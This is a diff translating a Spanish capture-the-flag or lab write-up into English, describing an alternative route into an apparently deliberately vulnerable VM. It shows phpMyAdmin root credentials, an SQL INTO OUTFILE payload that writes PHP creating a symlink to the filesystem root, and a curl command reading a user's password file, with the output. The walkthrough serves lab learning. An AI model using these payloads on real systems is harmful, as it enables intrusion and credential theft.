@@ -1,40 +1,40 @@
 # Writeup 3 - suExec
 
-## Índice:
+## Index:
 
-- [¿En qué consiste este método?](#en-qué-consiste-este-método)
-- [1. Acceso a phpMyAdmin](#1-acceso-a-phpmyadmin)
-- [2. Inyectando el symlink via suExec](#2-inyectando-el-symlink-via-suexec)
-- [3. Navegando el sistema de archivos](#3-navegando-el-sistema-de-archivos)
-- [4. Demostración acceso de lectura](#4-demostración-acceso-de-lectura)
+- [What does this method consist of?](#what-does-this-method-consist-of)
+- [1. Access to phpMyAdmin](#1-access-to-phpmyadmin)
+- [2. Injecting the symlink via suExec](#2-injecting-the-symlink-via-suexec)
+- [3. Navigating the file system](#3-navigating-the-file-system)
+- [4. Read access demonstration](#4-read-access-demonstration)
 
-## ¿En qué consiste este método?
+## What does this method consist of?
 
-Durante el writeup1 usamos phpMyAdmin para inyectar un webshell que nos permitía ejecutar comandos en el servidor. Este método es una alternativa más limpia que no requiere ejecución de comandos..
+During writeup1, we used phpMyAdmin to inject a webshell that allowed us to execute commands on the server. This method is a cleaner alternative that doesn't require command execution.
 
-En lugar de un webshell, usamos la vulnerabilidad **suExec** de Apache 2.2.22 para crear un **enlace simbólico a la raíz del sistema** y navegar por los archivos directamente desde el navegador sin necesidad de ejecutar comandos.
+Instead of a webshell, we used the **suExec** vulnerability in Apache 2.2.22 to create a **symbolic link to the system root** and navigate the files directly from the browser without needing to execute commands.
 
-**suExec** es una característica de Apache que permite ejecutar programas CGI y SSI bajo un usuario diferente al del servidor web. En esta versión tiene un bug que nos permite crear symlinks arbitrarios desde phpMyAdmin.
+**suExec** is an Apache feature that allows CGI and SSI programs to be executed under a different user than the web server. This version has a bug that allows us to create arbitrary symlinks from phpMyAdmin.
 
-## Explotación
+## Exploitation
 
-### 1. Acceso a phpMyAdmin
+### 1. Access to phpMyAdmin
 
-Accedemos a phpMyAdmin tal y como hicimos en el writeup1:
+We access phpMyAdmin just as we did in writeup1:
 
 ```
 https://192.168.0.35/phpmyadmin/
 ```
 
-Credenciales:
+Credentials:
 - Username: `root`
 - Password: `Fg-'kKXBj87E:aJ$`
 
 ![HTTPS phpmyadmin](img/phpmyadmin.png)
 
-### 2. Inyectando el symlink via suExec
+### 2. Injecting the symlink via suExec
 
-En lugar del webshell del writeup1, inyectamos un archivo PHP que crea un **enlace simbólico a la raíz `/`** del sistema:
+Instead of the writeup1 webshell, we inject a PHP file that creates a **symbolic link `/`** to the system's root directory:
 
 ```sql
 SELECT 1, '<?php symlink("/", "stuff.php");?>' INTO OUTFILE '/var/www/forum/templates_c/tosuexec.php'
@@ -42,7 +42,7 @@ SELECT 1, '<?php symlink("/", "stuff.php");?>' INTO OUTFILE '/var/www/forum/temp
 
 ![HTTPS phpmyadmin](img/phpmyadmin_02.png)
 
-Ahora accedemos al archivo para que se ejecute y cree el symlink:
+Now we access the file so that it runs and creates the symlink:
 
 ```
 https://192.168.0.35/forum/templates_c/tosuexec.php
@@ -50,9 +50,9 @@ https://192.168.0.35/forum/templates_c/tosuexec.php
 
 ![HTTPS phpmyadmin](img/01.png)
 
-### 3. Navegando el sistema de archivos
+### 3. Navigating the file system
 
-El symlink `stuff.php` apunta a la raíz `/` del sistema. Podemos navegar por todos los archivos del servidor directamente desde el navegador:
+The symlink `stuff.php` points to the system's root directory `/`. We can navigate through all the server's files directly from the browser:
 
 ```
 https://192.168.0.35/forum/templates_c/stuff.php
@@ -60,22 +60,20 @@ https://192.168.0.35/forum/templates_c/stuff.php
 
 ![HTTPS stuffphp](img/stuffphp.png)
 
-Ahora tenemos acceso a la raíz del sistema completa desde el navegador. Podemos ver `bin/`, `etc/`, `home/`, `var/`, etc.
+We now have full access to the system root from the browser. We can see `bin/`, `etc/`, `home/`, `var/`, etc.
 
-### 4. Demostración acceso de lectura
+### 4. Read access demonstration
 
-Lo importante para este writeup es demostrar que tenemos acceso de lectura al sistema de archivos completo.
+The important thing for this writeup is to demonstrate that we have read access to the entire file system.
 
-Vamos a  leer `/home/LOOKATME/password` que es el punto de entrada de la cadena del **`writeup1`**:
+We're going to read `/home/LOOKATME/password`, which is the entry point of the `writeup1` string:
 
 ```bash
 curl -kL "https://192.168.0.35/forum/templates_c/stuff.php/home/LOOKATME/password"
 lmezard:G!@M6f4Eatau{sF"
 ```
 ```bash
-Usuario: lmezard
+User: lmezard
 Password:  G!@M6f4Eatau{sF"
 ```
-A partir de aquí podemos continuar toda la cadena del writeup1 —
-encontramos las credenciales FTP de `lmezard` sin necesidad de haber
-creado un webshell.
+From here we can continue the entire writeup1 chain — we find the FTP credentials of `lmezard` without having reated a webshell.
